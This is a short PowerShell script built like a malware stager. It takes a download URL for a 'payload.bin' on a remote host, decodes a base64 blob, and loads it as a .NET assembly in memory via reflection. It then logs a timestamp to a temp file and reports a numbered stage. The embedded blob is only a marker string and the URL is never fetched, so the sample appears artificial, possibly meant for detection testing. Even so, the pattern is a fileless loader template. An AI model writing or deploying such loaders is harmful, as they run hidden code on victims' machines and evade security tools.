[CmdletBinding()]
param(
    [string]$DownloadUrl = 'http://adatum.com:8080/payload.bin',
    [int]$TimeoutSec = 157
)
$ErrorActionPreference = "Stop"

$PayloadBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjp5ZDJ1Yzgydmc1")
Write-Verbose ("Assembly byte count: " + $PayloadBytes.Length)
$FetchResult = [Reflection.Assembly]::Load($PayloadBytes)
if ($null -ne $FetchResult) {
    Write-Verbose ("Loaded assembly: " + $FetchResult.FullName)
}

Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
Write-Output "stage 7 initialized"
